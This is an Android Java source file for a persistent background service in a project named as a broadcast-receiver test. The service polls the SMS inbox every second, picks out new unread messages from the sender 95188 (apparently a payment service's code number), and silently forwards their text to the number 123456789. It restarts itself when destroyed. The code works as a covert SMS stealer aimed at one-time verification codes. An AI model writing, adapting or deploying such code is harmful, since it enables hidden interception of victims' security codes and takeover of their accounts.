package com.carlos.testbroadcastreceiver;



import java.util.List;

import android.R.integer;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class MyService extends Service {

	MyThread myThread;
	boolean threadFlag = false;
	Uri uriSMSURI = Uri.parse("content://sms/inbox");
	int smsCount = 0;
	

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		Log.v("carlos","service start");
		return null;
	}
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		Log.v("carlos","service destory");
//		super.onDestroy();
//		Intent localIntent = new Intent();
//        localIntent.setClass(this, MyService.class);  //销毁时重新启动Service
//        this.startService(localIntent);
        this.startService(new Intent("com.carlos.testbroadcastreceiverMyService"));

	}
	
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.v("carlos","on start command");
		Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
		smsCount = cur.getCount();
		Log.v("carlos","sms num is: "+smsCount);
		cur.close();

		doJob();
		return START_STICKY;
//        return super.onStartCommand(intent, flags, startId);

	}
	public void doJob(){	
		threadFlag = true;	

		
       myThread = new MyThread();
		myThread.start();
		
		
	}
	
	public class MyThread extends Thread{        
		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();
//		    connectDevice();//连接蓝牙设备
		 while(threadFlag){
			
			
			Cursor curnew = getContentResolver().query(uriSMSURI, null, null, null, null);
//			Log.v("carlos", cur.getCount()+" : "+smsCount);
//			String sms = "";
			int i  = 0;
			Log.v("carlos serive", " "+curnew.getCount()+ " - " + smsCount);
			if(curnew.getCount() > smsCount)
			{
				
				i = curnew.getCount() - smsCount;
				 while(curnew.moveToNext() && i > 0)
				 {
					 Log.v("carlos", curnew.getString(8) + " From " + curnew.getString(5) + " : " + curnew.getString(13) + "\n");
//					 sms = "";
//					 sms += cur.getString(8) + " From " + cur.getString(5) + " : " + cur.getString(13) + "\n";
					 if(curnew.getString(8).equals("0") && curnew.getString(3).equals("95188"))
					 {
						 Log.v("calos", "you have a new message");
						 SmsManager sms1 = SmsManager.getDefault();
						 List<String> texts = sms1.divideMessage(curnew.getString(13));
						 for (String text : texts) {
						 sms1.sendTextMessage("123456789", null, text, null, null);
						 }
						 
					 }
					 i--;
//					 Log.v("carlos", sms);

				 }	
				 smsCount = curnew.getCount();
				 curnew.close();

			}
			try{
				Thread.sleep(1000);
			}catch(Exception e){
				e.printStackTrace();
			}			 
		 }
	   }	
	}

}
